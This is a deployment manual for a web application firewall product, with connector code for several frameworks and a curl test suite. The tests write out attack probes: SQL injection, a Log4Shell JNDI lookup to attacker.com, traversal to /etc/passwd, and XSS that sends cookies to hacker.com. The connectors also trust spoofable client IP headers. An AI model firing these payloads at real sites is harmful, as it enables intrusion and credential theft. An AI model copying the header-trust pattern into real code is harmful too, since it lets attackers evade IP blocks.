# SENTINELGRID WAAP // PRODUCTION ONBOARDING & INTEGRATION MANUAL
**Document Reference:** SG-INT-GUIDE-2026-PROD-V1  
**Classification:** Systems Engineering / Deployment Guide  
**Author:** Anup Dhokiya (@anup-dhokiya) - Lead Architect  
**Platform:** SentinelGrid Web Application & API Protection (WAAP) Control Plane  
**Target Environments:** Python (ASGI/WSGI), Node.js (Express/Next.js), Nginx, Go `net/http`, Cloudflare Workers, Docker Compose  

---

## 1. System Architecture & Integration Topologies

SentinelGrid operates as an ultra-low latency (<1.5ms) security inspection and telemetry plane. Third-party applications, reverse proxies, and microservices integrate with SentinelGrid using one of two architectural modes:

```
MODE A: IN-LINE SYNCHRONOUS ENFORCEMENT (Inspect-Before-Serve)
Client Request
      |
      v
+---------------+       (1) POST /v1/inspect       +---------------------+
| Ingress Proxy | -------------------------------> | SentinelGrid Engine |
| or Middleware | <------------------------------- |   (Sub-1.5ms WAF)   |
+---------------+       (2) 200 ALLOW or 403 BLOCK +---------------------+
      |
      +---> (Action == BLOCK) ---------> Return RFC 403 Forbidden to Client
      |
      +---> (Action == ALLOW) ---------> Forward to Origin Application Service

--------------------------------------------------------------------------------

MODE B: PASSIVE SHADOW OBSERVATION (Zero-Latency Asynchronous Mirroring)
Client Request
      |
      v
+---------------+  (1) Immediate Proxy Pass       +-------------------------+
| Ingress Proxy | ------------------------------> | Origin Application Host |
| or Middleware |                                 +-------------------------+
+---------------+
      |
      +--- (2) Asynchronous Non-Blocking Fork ---> +---------------------+
           (Mirror / Background Thread)           | SentinelGrid Engine |
                                                  | (Discovers Shadow   |
                                                  |  APIs & Logs SIEM)  |
                                                  +---------------------+
```

---

## 2. Header Propagation & Wire Specification

Every connector MUST propagate client network attributes and forward inspector response headers for upstream correlation:

### Required Upstream Headers (Client -> Connector -> SentinelGrid):
| Header Name | Source Variable | Description |
| :--- | :--- | :--- |
| `Host` | Client Host / SNI | The Fully Qualified Domain Name (FQDN) requested by the client. |
| `X-Real-IP` | Remote Address | Origin IPv4 or IPv6 client socket address (bypassing CDN/proxy hops). |
| `X-Forwarded-For` | Client Proxy Chain | Comma-delimited list of all intermediate proxy IP addresses. |
| `User-Agent` | Client Header | Raw user agent string for bot classification and scanner detection. |
| `Content-Type` | Client Header | Required for correct body deserialization (JSON, form-urlencoded, multipart). |

### Response Headers Emitted by SentinelGrid (`/v1/inspect`):
| Header Name | Type | Description |
| :--- | :--- | :--- |
| `X-SentinelGrid-Action` | String | Verdict rendered: `ALLOW`, `BLOCK`, or `CHALLENGE`. |
| `X-SentinelGrid-Score` | Float | Calculated threat score between `0.0` (clean) and `100.0` (critical). |
| `X-SentinelGrid-Rule` | String | Identifier of top rule triggered (e.g. `CVE-2021-44228-LOG4J`, `IP-BLOCK-LIST`). |
| `X-SentinelGrid-Event-ID`| UUID | Unique forensic identifier stored in SIEM telemetry for audit cross-referencing. |

---

## 3. Fail-Open vs. Fail-Close Semantics

Connectors must implement deterministic failure handling when SentinelGrid is unreachable or socket timeouts expire:

* **Fail-Open (Recommended for E-Commerce / Consumer Web):** If the SentinelGrid API returns HTTP 5xx, encounters connection refused, or exceeds socket timeout (default: 50ms), the connector allows the request through to the origin and writes an alert to local error logs.
* **Fail-Close (Mandatory for High-Security / Banking / PCI-DSS Vaults):** If the SentinelGrid API is unreachable, the connector immediately aborts the pipeline, returning `HTTP 503 Service Unavailable` or `HTTP 403 Forbidden`, preventing uninspected payloads from reaching origin endpoints.

---

## 4. Production Integration Implementations

---

### 4.1 Python ASGI Middleware (FastAPI / Starlette)

This middleware provides asynchronous in-line inspection. It safely caches the request body in memory, ensuring that downstream Starlette/FastAPI route handlers can consume `await request.body()` without encountering stream exhaustion.

Save as `sentinelgrid_asgi.py`:

```python
"""
SentinelGrid ASGI Middleware for FastAPI / Starlette
Provides non-blocking async request inspection with stream buffering and fail-open policy.
"""

import logging
import json
from typing import Callable, Dict, Any
import httpx
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

logger = logging.getLogger("sentinelgrid.asgi")


class SentinelGridASGIMiddleware(BaseHTTPMiddleware):
    def __init__(
        self,
        app,
        sentinelgrid_url: str = "http://127.0.0.1:8000/v1/inspect",
        website_id: str = "default-site",
        timeout_seconds: float = 0.05,  # 50ms strict budget
        fail_open: bool = True,
        max_body_bytes: int = 65536     # Inspect up to first 64KB
    ):
        super().__init__(app)
        self.sentinelgrid_url = sentinelgrid_url
        self.website_id = website_id
        self.timeout_seconds = timeout_seconds
        self.fail_open = fail_open
        self.max_body_bytes = max_body_bytes
        # Pre-warmed persistent async client with connection pooling
        self.http_client = httpx.AsyncClient(
            limits=httpx.Limits(max_keepalive_connections=50, max_connections=200),
            timeout=httpx.Timeout(self.timeout_seconds, connect=0.02)
        )

    async def dispatch(self, request: Request, call_next: Callable) -> Response:
        # 1. Extract client IP respecting reverse proxy chain
        client_ip = (
            request.headers.get("x-real-ip")
            or request.headers.get("x-forwarded-for", "").split(",")[0].strip()
            or (request.client.host if request.client else "127.0.0.1")
        )

        # 2. Buffer request body safely without exhausting stream
        body_bytes = await request.body()
        body_sample = body_bytes[:self.max_body_bytes].decode("utf-8", errors="replace")

        # 3. Construct inspection payload
        payload = {
            "website_id": self.website_id,
            "method": request.method,
            "path": request.url.path,
            "query_params": str(request.url.query),
            "body": body_sample,
            "headers": dict(request.headers),
            "client_ip": client_ip
        }

        # 4. Evaluate with SentinelGrid core engine
        try:
            resp = await self.http_client.post(self.sentinelgrid_url, json=payload)
            if resp.status_code == 200:
                decision = resp.json()
                action = decision.get("action", "ALLOW")

                if action == "BLOCK":
                    event_id = decision.get("event_id", "N/A")
                    rule = decision.get("rule_triggered", "SECURITY-POLICY")
                    logger.warning(
                        "SentinelGrid BLOCKED request: ip=%s path=%s rule=%s event_id=%s",
                        client_ip, request.url.path, rule, event_id
                    )
                    block_html = (
                        f"<!DOCTYPE html><html><head><title>403 Forbidden</title></head>"
                        f"<body style='font-family:sans-serif;padding:40px;text-align:center;'>"
                        f"<h2>403 Forbidden - Request Blocked by SentinelGrid WAAP</h2>"
                        f"<p>Malicious signature or policy violation detected.</p>"
                        f"<p style='color:#666;font-family:monospace;font-size:12px;'>Event ID: {event_id} | Rule: {rule}</p>"
                        f"</body></html>"
                    )
                    return Response(
                        content=block_html,
                        status_code=403,
                        media_type="text/html",
                        headers={
                            "X-SentinelGrid-Action": "BLOCK",
                            "X-SentinelGrid-Event-ID": event_id,
                            "X-SentinelGrid-Rule": rule
                        }
                    )
        except Exception as exc:
            if not self.fail_open:
                logger.error("SentinelGrid unreachable and fail_open=False. Aborting request: %s", exc)
                return Response(content="503 Service Unavailable: Security Verification Offline", status_code=503)
            logger.debug("SentinelGrid fail-open triggered (allowing request): %s", exc)

        # 5. Pass clean request to origin application
        response = await call_next(request)
        return response
```

#### Mounting in FastAPI (`main.py`):
```python
from fastapi import FastAPI
from sentinelgrid_asgi import SentinelGridASGIMiddleware

app = FastAPI(title="Production Microservice")

# Register SentinelGrid before application routes
app.add_middleware(
    SentinelGridASGIMiddleware,
    sentinelgrid_url="http://127.0.0.1:8000/v1/inspect",
    website_id="site-production-api",
    timeout_seconds=0.05,
    fail_open=True
)

@app.get("/api/v1/orders")
async def list_orders():
    return {"status": "ok", "orders": []}
```

---

### 4.2 Python WSGI Middleware (Django / Flask)

For legacy and synchronous WSGI stacks (Gunicorn, uWSGI, Flask, Django). It rewinds `wsgi.input` using `io.BytesIO` so Flask/Django form handlers can parse multipart/data seamlessly.

Save as `sentinelgrid_wsgi.py`:

```python
"""
SentinelGrid WSGI Middleware for Django & Flask
Synchronous in-line inspection with input buffer rewinding and urllib3 connection pooling.
"""

import io
import json
import logging
import urllib3

logger = logging.getLogger("sentinelgrid.wsgi")


class SentinelGridWSGIMiddleware:
    def __init__(
        self,
        app,
        sentinelgrid_url: str = "http://127.0.0.1:8000/v1/inspect",
        website_id: str = "default-site",
        timeout_seconds: float = 0.05,
        fail_open: bool = True
    ):
        self.app = app
        self.sentinelgrid_url = sentinelgrid_url
        self.website_id = website_id
        self.timeout_seconds = timeout_seconds
        self.fail_open = fail_open
        self.http_pool = urllib3.PoolManager(
            maxsize=50,
            timeout=urllib3.Timeout(total=self.timeout_seconds)
        )

    def __call__(self, environ, start_response):
        # 1. Capture Client IP
        client_ip = (
            environ.get("HTTP_X_REAL_IP")
            or environ.get("HTTP_X_FORWARDED_FOR", "").split(",")[0].strip()
            or environ.get("REMOTE_ADDR", "127.0.0.1")
        )

        # 2. Extract Request URI attributes
        method = environ.get("REQUEST_METHOD", "GET")
        path = environ.get("PATH_INFO", "/")
        query = environ.get("QUERY_STRING", "")

        # 3. Buffer input stream and rewind
        content_length = int(environ.get("CONTENT_LENGTH", 0) or 0)
        body_str = ""
        if content_length > 0:
            raw_body = environ["wsgi.input"].read(content_length)
            body_str = raw_body[:65536].decode("utf-8", errors="replace")
            # Crucial: Rewind stream for Django/Flask
            environ["wsgi.input"] = io.BytesIO(raw_body)

        # 4. Extract HTTP Headers
        headers = {}
        for k, v in environ.items():
            if k.startswith("HTTP_"):
                header_name = k[5:].replace("_", "-").lower()
                headers[header_name] = v

        payload = {
            "website_id": self.website_id,
            "method": method,
            "path": path,
            "query_params": query,
            "body": body_str,
            "headers": headers,
            "client_ip": client_ip
        }

        # 5. In-line inspect
        try:
            encoded_body = json.dumps(payload).encode("utf-8")
            resp = self.http_pool.request(
                "POST",
                self.sentinelgrid_url,
                body=encoded_body,
                headers={"Content-Type": "application/json"}
            )
            if resp.status == 200:
                data = json.loads(resp.data.decode("utf-8"))
                if data.get("action") == "BLOCK":
                    event_id = data.get("event_id", "N/A")
                    rule = data.get("rule_triggered", "POLICY-BLOCK")
                    block_body = (
                        f"<html><body><h1>403 Forbidden</h1>"
                        f"<p>Request blocked by SentinelGrid WAAP [Event: {event_id}]</p></body></html>"
                    ).encode("utf-8")
                    start_response("403 Forbidden", [
                        ("Content-Type", "text/html"),
                        ("Content-Length", str(len(block_body))),
                        ("X-SentinelGrid-Action", "BLOCK"),
                        ("X-SentinelGrid-Event-ID", event_id),
                        ("X-SentinelGrid-Rule", rule)
                    ])
                    return [block_body]
        except Exception as exc:
            if not self.fail_open:
                err_msg = b"503 Service Unavailable: Security Inspection Failure"
                start_response("503 Service Unavailable", [("Content-Type", "text/plain"), ("Content-Length", str(len(err_msg)))])
                return [err_msg]
            logger.debug("SentinelGrid fail-open (allowing request): %s", exc)

        return self.app(environ, start_response)
```

#### Mounting in Flask (`app.py`):
```python
from flask import Flask
from sentinelgrid_wsgi import SentinelGridWSGIMiddleware

flask_app = Flask(__name__)

# Wrap the WSGI callable directly
flask_app.wsgi_app = SentinelGridWSGIMiddleware(
    flask_app.wsgi_app,
    sentinelgrid_url="http://127.0.0.1:8000/v1/inspect",
    website_id="site-flask-app",
    fail_open=True
)

@flask_app.route("/api/hello")
def hello():
    return {"message": "Authenticated access granted"}
```

---

### 4.3 Node.js Express Middleware

Compatible with CommonJS and ES Modules. Utilizes `http.Agent` with `keepAlive: true` to minimize TCP handshake overhead to <0.5ms.

Save as `sentinelgrid-express.js`:

```javascript
/**
 * SentinelGrid In-Line WAAP Middleware for Express / NestJS
 * Features: Keep-Alive HTTP agent, fail-open policy, exact header propagation.
 */

const http = require('http');

class SentinelGridExpress {
  constructor(options = {}) {
    this.sentinelgridUrl = options.sentinelgridUrl || 'http://127.0.0.1:8000/v1/inspect';
    this.websiteId = options.websiteId || 'default-site';
    this.timeoutMs = options.timeoutMs || 50;
    this.failOpen = options.failOpen !== false;

    const parsed = new URL(this.sentinelgridUrl);
    this.agent = new http.Agent({
      keepAlive: true,
      maxSockets: 100,
      maxFreeSockets: 20
    });
    this.requestOptions = {
      protocol: parsed.protocol,
      hostname: parsed.hostname,
      port: parsed.port || 8000,
      path: parsed.pathname,
      method: 'POST',
      agent: this.agent,
      headers: { 'Content-Type': 'application/json' },
      timeout: this.timeoutMs
    };
  }

  middleware() {
    return (req, res, next) => {
      // 1. Resolve client IP
      const clientIp = (
        req.headers['x-real-ip'] ||
        (req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : null) ||
        req.socket.remoteAddress ||
        '127.0.0.1'
      );

      // 2. Format request body
      let bodyStr = '';
      if (req.body) {
        bodyStr = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
      }

      // 3. Assemble SentinelGrid payload
      const payload = JSON.stringify({
        website_id: this.websiteId,
        method: req.method,
        path: req.path,
        query_params: new URLSearchParams(req.query).toString(),
        body: bodyStr.slice(0, 65536),
        headers: req.headers,
        client_ip: clientIp
      });

      let finished = false;
      const inspectReq = http.request(this.requestOptions, (inspectRes) => {
        let rawData = '';
        inspectRes.on('data', (chunk) => { rawData += chunk; });
        inspectRes.on('end', () => {
          if (finished) return;
          finished = true;

          try {
            if (inspectRes.statusCode === 200) {
              const decision = JSON.parse(rawData);
              if (decision.action === 'BLOCK') {
                const eventId = decision.event_id || 'N/A';
                const rule = decision.rule_triggered || 'BLOCKED';
                res.status(403)
                   .set('X-SentinelGrid-Action', 'BLOCK')
                   .set('X-SentinelGrid-Event-ID', eventId)
                   .set('X-SentinelGrid-Rule', rule)
                   .send(`<h3>403 Forbidden: Blocked by SentinelGrid WAAP [${eventId}]</h3>`);
                return;
              }
            }
          } catch (e) {
            // Parse error: fall through to next()
          }
          next();
        });
      });

      inspectReq.on('timeout', () => {
        inspectReq.destroy();
        if (!finished) {
          finished = true;
          if (this.failOpen) next();
          else res.status(503).send('503 Service Unavailable: Security Timeout');
        }
      });

      inspectReq.on('error', (err) => {
        if (!finished) {
          finished = true;
          if (this.failOpen) next();
          else res.status(503).send('503 Service Unavailable: Security Agent Error');
        }
      });

      inspectReq.write(payload);
      inspectReq.end();
    };
  }
}

module.exports = SentinelGridExpress;
```

#### Usage in Express (`server.js`):
```javascript
const express = require('express');
const SentinelGridExpress = require('./sentinelgrid-express');

const app = express();
app.use(express.json());

const sentinel = new SentinelGridExpress({
  sentinelgridUrl: 'http://127.0.0.1:8000/v1/inspect',
  websiteId: 'site-express-backend',
  timeoutMs: 40,
  failOpen: true
});

app.use(sentinel.middleware());

app.get('/api/v1/products', (req, res) => {
  res.json({ products: [{ id: 1, name: 'Secure Widget' }] });
});

app.listen(3000, () => console.log('Express app listening on port 3000'));
```

---

### 4.4 Next.js App Router / Edge Middleware

Save as `middleware.ts` in your Next.js project root:

```typescript
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export async function middleware(request: NextRequest) {
  const sentinelUrl = process.env.SENTINELGRID_URL || 'http://127.0.0.1:8000/v1/inspect';
  const websiteId = process.env.SENTINELGRID_WEBSITE_ID || 'nextjs-app';

  // 1. Extract IP
  const clientIp = request.ip || request.headers.get('x-real-ip') || '127.0.0.1';

  // 2. Clone headers
  const headersObj: Record<string, string> = {};
  request.headers.forEach((value, key) => { headersObj[key] = value; });

  // 3. Inspect via Fetch API with AbortController timeout
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 60);

  try {
    const payload = {
      website_id: websiteId,
      method: request.method,
      path: request.nextUrl.pathname,
      query_params: request.nextUrl.search,
      body: '',
      headers: headersObj,
      client_ip: clientIp
    };

    const inspectRes = await fetch(sentinelUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal
    });
    clearTimeout(timeoutId);

    if (inspectRes.ok) {
      const decision = await inspectRes.json();
      if (decision.action === 'BLOCK') {
        return new NextResponse(
          `<html><body><h1>403 Forbidden</h1><p>Blocked by SentinelGrid WAAP [${decision.event_id}]</p></body></html>`,
          {
            status: 403,
            headers: {
              'Content-Type': 'text/html',
              'X-SentinelGrid-Action': 'BLOCK',
              'X-SentinelGrid-Event-ID': decision.event_id || ''
            }
          }
        );
      }
    }
  } catch (err) {
    // Fail-open: pass request through on connection timeout
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/api/:path*', '/checkout/:path*', '/auth/:path*']
};
```

---

### 4.5 Nginx Reverse Proxy Integration

Nginx provides language-agnostic inspection before requests reach PHP-FPM, Python, Ruby, Go, or Java backends.

#### Option A: In-Line Synchronous Blocking (`ngx_http_auth_request_module`)
Every request triggers an internal sub-request to SentinelGrid. If SentinelGrid responds with `200 OK`, Nginx proxies traffic to origin. If SentinelGrid responds with `403 Forbidden`, Nginx intercepts and serves a custom block page.

Save as `/etc/nginx/conf.d/sentinelgrid-inline.conf`:

```nginx
# Upstream Definition for Origin Application
upstream origin_application {
    server 127.0.0.1:3000;
    keepalive 32;
}

# Upstream Definition for SentinelGrid Control Plane
upstream sentinelgrid_engine {
    server 127.0.0.1:8000;
    keepalive 64;
}

server {
    listen 80;
    listen 443 ssl http2;
    server_name yourdomain.com api.yourdomain.com;

    # SSL Termination (Specify your certificates)
    # ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    # ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    # Global proxy header propagation
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;

    # 1. Protected Ingress Location
    location / {
        # Enforce sub-request authorization
        auth_request /_sentinelgrid_verify;

        # Capture response headers from SentinelGrid
        auth_request_set $sg_action $upstream_http_x_sentinelgrid_action;
        auth_request_set $sg_event  $upstream_http_x_sentinelgrid_event_id;
        auth_request_set $sg_rule   $upstream_http_x_sentinelgrid_rule;

        # Add tracking headers to downstream client response
        add_header X-SentinelGrid-Action $sg_action always;
        add_header X-SentinelGrid-Event-ID $sg_event always;

        # Forward legitimate traffic to application
        proxy_pass http://origin_application;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
    }

    # 2. Internal SentinelGrid Verification Sub-Request
    location = /_sentinelgrid_verify {
        internal;
        proxy_pass http://sentinelgrid_engine/v1/inspect;
        proxy_pass_request_body on;
        
        # Sub-request timeout tuning (50ms budget)
        proxy_connect_timeout 30ms;
        proxy_read_timeout 50ms;
        proxy_send_timeout 50ms;

        # Header propagation to inspector
        proxy_set_header Content-Type "application/json";
        proxy_set_header X-Original-URI $request_uri;
        proxy_set_header X-Original-Method $request_method;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;

        # Discard sub-request body from response
        proxy_set_header Content-Length "";
    }

    # 3. Custom WAF Block Page
    error_page 403 /sentinelgrid_block.html;
    location = /sentinelgrid_block.html {
        internal;
        root /usr/share/nginx/html;
    }
}
```

#### Option B: Asynchronous Observation Mirroring (`ngx_http_mirror_module`)
Incoming requests pass directly to origin with **zero latency penalty**. An exact duplicate copy of the request is asynchronously mirrored to SentinelGrid for shadow API discovery and threat analytics.

```nginx
server {
    listen 80;
    server_name mirror.yourdomain.com;

    location / {
        # Enable asynchronous mirroring
        mirror /_sentinelgrid_async;
        mirror_request_body on;

        # Serve immediately from origin
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Mirrored destination (discards response, never affects client)
    location = /_sentinelgrid_async {
        internal;
        proxy_pass http://127.0.0.1:8000/v1/inspect;
        proxy_connect_timeout 20ms;
        proxy_read_timeout 30ms;
        proxy_ignore_client_abort on;
    }
}
```

---

### 4.6 Go `net/http` Reverse Proxy Middleware

Production Go 1.21+ middleware utilizing buffered request body cloning and context timeouts.

Save as `sentinelgrid.go`:

```go
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type SentinelGridMiddleware struct {
	SentinelGridURL string
	WebsiteID       string
	Timeout         time.Duration
	FailOpen        bool
	Client          *http.Client
}

type InspectRequest struct {
	WebsiteID   string            `json:"website_id"`
	Method      string            `json:"method"`
	Path        string            `json:"path"`
	QueryParams string            `json:"query_params"`
	Body        string            `json:"body"`
	Headers     map[string]string `json:"headers"`
	ClientIP    string            `json:"client_ip"`
}

type InspectResponse struct {
	Action        string  `json:"action"`
	RiskScore     float64 `json:"risk_score"`
	RuleTriggered string  `json:"rule_triggered"`
	EventID       string  `json:"event_id"`
}

func NewSentinelGridMiddleware(url, websiteID string, timeout time.Duration, failOpen bool) *SentinelGridMiddleware {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 50,
		IdleConnTimeout:     90 * time.Second,
	}
	return &SentinelGridMiddleware{
		SentinelGridURL: url,
		WebsiteID:       websiteID,
		Timeout:         timeout,
		FailOpen:        failOpen,
		Client:          &http.Client{Transport: transport, Timeout: timeout},
	}
}

func (sg *SentinelGridMiddleware) Wrap(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 1. Resolve client IP
		clientIP := r.Header.Get("X-Real-IP")
		if clientIP == "" {
			if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
				clientIP = strings.TrimSpace(strings.Split(xff, ",")[0])
			} else {
				clientIP = strings.Split(r.RemoteAddr, ":")[0]
			}
		}

		// 2. Buffer request body safely without draining
		var bodyBytes []byte
		if r.Body != nil {
			var err error
			bodyBytes, err = io.ReadAll(r.Body)
			if err == nil {
				r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
			}
		}

		// 3. Collect headers
		headers := make(map[string]string)
		for k, v := range r.Header {
			if len(v) > 0 {
				headers[strings.ToLower(k)] = v[0]
			}
		}

		bodySnippet := string(bodyBytes)
		if len(bodySnippet) > 65536 {
			bodySnippet = bodySnippet[:65536]
		}

		payload := InspectRequest{
			WebsiteID:   sg.WebsiteID,
			Method:      r.Method,
			Path:        r.URL.Path,
			QueryParams: r.URL.RawQuery,
			Body:        bodySnippet,
			Headers:     headers,
			ClientIP:    clientIP,
		}

		// 4. Dispatch inspection
		marshaled, _ := json.Marshal(payload)
		ctx, cancel := context.WithTimeout(r.Context(), sg.Timeout)
		defer cancel()

		req, err := http.NewRequestWithContext(ctx, "POST", sg.SentinelGridURL, bytes.NewBuffer(marshaled))
		if err == nil {
			req.Header.Set("Content-Type", "application/json")
			resp, err := sg.Client.Do(req)
			if err == nil && resp.StatusCode == http.StatusOK {
				var decision InspectResponse
				if json.NewDecoder(resp.Body).Decode(&decision) == nil {
					resp.Body.Close()
					if decision.Action == "BLOCK" {
						w.Header().Set("Content-Type", "text/html")
						w.Header().Set("X-SentinelGrid-Action", "BLOCK")
						w.Header().Set("X-SentinelGrid-Event-ID", decision.EventID)
						w.WriteHeader(http.StatusForbidden)
						fmt.Fprintf(w, "<h3>403 Forbidden: Request Blocked by SentinelGrid WAAP [%s]</h3>", decision.EventID)
						return
					}
				}
			} else if !sg.FailOpen {
				http.Error(w, "503 Service Unavailable: Security Verification Offline", http.StatusServiceUnavailable)
				return
			}
		}

		next.ServeHTTP(w, r)
	})
}
```

---

### 4.7 Cloudflare Worker Edge Handler

Executes at 300+ global Cloudflare edge data centers, stopping threats before traffic touches your VPC origin.

Save as `cloudflare_worker.js`:

```javascript
/**
 * SentinelGrid Edge Worker for Cloudflare
 * Global in-line WAF execution with sub-second fail-open fallback.
 */

export default {
  async fetch(request, env, ctx) {
    const SENTINELGRID_API = env.SENTINELGRID_API || "https://waf.yourcorp.com/v1/inspect";
    const WEBSITE_ID = env.WEBSITE_ID || "edge-corp-portal";

    const url = new URL(request.url);
    const clientIp = request.headers.get("cf-connecting-ip") || "127.0.0.1";

    // Clone headers
    const headers = {};
    for (const [key, value] of request.headers.entries()) {
      headers[key] = value;
    }

    // Capture body sample for POST/PUT/PATCH
    let body = "";
    if (["POST", "PUT", "PATCH"].includes(request.method)) {
      try {
        const cloned = request.clone();
        body = await cloned.text();
      } catch (e) {}
    }

    const payload = {
      website_id: WEBSITE_ID,
      method: request.method,
      path: url.pathname,
      query_params: url.search,
      body: body.slice(0, 32768),
      headers: headers,
      client_ip: clientIp
    };

    // Sub-request with 60ms timeout
    try {
      const inspectRes = await fetch(SENTINELGRID_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        cf: { timeout: 60 }
      });

      if (inspectRes.ok) {
        const verdict = await inspectRes.json();
        if (verdict.action === "BLOCK") {
          return new Response(
            `<html><body style="font-family:sans-serif;padding:30px;text-align:center;">` +
            `<h2>403 Forbidden: Blocked by SentinelGrid Global WAAP</h2>` +
            `<p>Event ID: ${verdict.event_id} | Signature: ${verdict.rule_triggered}</p>` +
            `</body></html>`,
            {
              status: 403,
              headers: {
                "Content-Type": "text/html",
                "X-SentinelGrid-Action": "BLOCK",
                "X-SentinelGrid-Event-ID": verdict.event_id || "N/A"
              }
            }
          );
        }
      }
    } catch (err) {
      // Fail-open: pass through to origin
    }

    return fetch(request);
  }
};
```

---

### 4.8 Production Docker Compose Sidecar Deployment

This template deploys your application service behind an autonomous Nginx sidecar running SentinelGrid observation hooks on a private Docker bridge.

Save as `docker-compose.yml`:

```yaml
version: '3.8'

services:
  # 1. Origin Backend Microservice
  app-origin:
    image: python:3.11-slim
    command: python -m http.server 3000
    networks:
      - internal-net

  # 2. SentinelGrid WAAP Control Plane Engine
  sentinelgrid-waap:
    image: sentinelgrid/core:1.0.0
    environment:
      - DB_PATH=/data/sentinelgrid.db
      - FAIL_OPEN=true
    volumes:
      - sentinelgrid_data:/data
    networks:
      - internal-net

  # 3. SentinelGrid Ingress Sidecar (Nginx Reverse Proxy)
  ingress-sidecar:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx-sidecar.conf:/etc/nginx/conf.d/default.conf:ro
    depends_on:
      - app-origin
      - sentinelgrid-waap
    networks:
      - internal-net

networks:
  internal-net:
    driver: bridge

volumes:
  sentinelgrid_data:
```

---

## 5. Verification & Chaos Testing Suite

Execute the following `curl` integration tests against your connected website to verify exact enforcement:

### Test 1: Clean Baseline Request (Must Return HTTP 200)
```bash
curl -i -X GET "http://localhost/api/v1/health" \
  -H "Host: yoursite.com" \
  -H "User-Agent: Mozilla/5.0"
```
*Expected Result:* HTTP 200 OK.

---

### Test 2: SQL Injection Probe (Must Return HTTP 403)
```bash
curl -i -X GET "http://localhost/products?category=books'%20UNION%20SELECT%20username,password%20FROM%20users--" \
  -H "Host: yoursite.com"
```
*Expected Result:* HTTP 403 Forbidden with `X-SentinelGrid-Action: BLOCK`.

---

### Test 3: Log4Shell Remote Code Execution CVE-2021-44228
```bash
curl -i -X POST "http://localhost/api/v1/auth" \
  -H "Host: yoursite.com" \
  -H "User-Agent: \${jndi:ldap://attacker.com/exploit}" \
  -d '{"user":"admin"}'
```
*Expected Result:* HTTP 403 Forbidden with `rule_triggered: CVE-2021-44228-LOG4J`.

---

### Test 4: Path Traversal & LFI Attack Probe
```bash
curl -i -X GET "http://localhost/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd" \
  -H "Host: yoursite.com"
```
*Expected Result:* HTTP 403 Forbidden.

---

### Test 5: Cross-Site Scripting (XSS) Stored Vector
```bash
curl -i -X POST "http://localhost/comments" \
  -H "Content-Type: application/json" \
  -d '{"author":"attacker","comment":"<script>document.location=\"http://hacker.com/\"+document.cookie</script>"}'
```
*Expected Result:* HTTP 403 Forbidden.

---

### Test 6: Undocumented Route (Verify Shadow API Auto-Discovery)
```bash
curl -i -X GET "http://localhost/api/internal/debug-export" \
  -H "Host: yoursite.com"
```
*Expected Result:* Route succeeds (if permitted by origin) and is instantly registered as `status: shadow` in SentinelGrid's API catalog.

---

### Test 7: Blocked IP / CIDR Subnet Access
```bash
curl -i -X GET "http://localhost/api/v1/users" \
  -H "X-Real-IP: 198.51.100.42"
```
*Expected Result:* HTTP 403 Forbidden with `rule_triggered: IP-BLOCK-LIST`.

---

### Test 8: Fail-Open Resilience Verification
```bash
# Temporarily pause the SentinelGrid engine
sudo systemctl stop sentinelgrid || docker stop sentinelgrid-waap

# Dispatch clean request to your application
curl -i -X GET "http://localhost/api/v1/health"
```
*Expected Result:* HTTP 200 OK. Application remains completely online despite WAAP downtime.
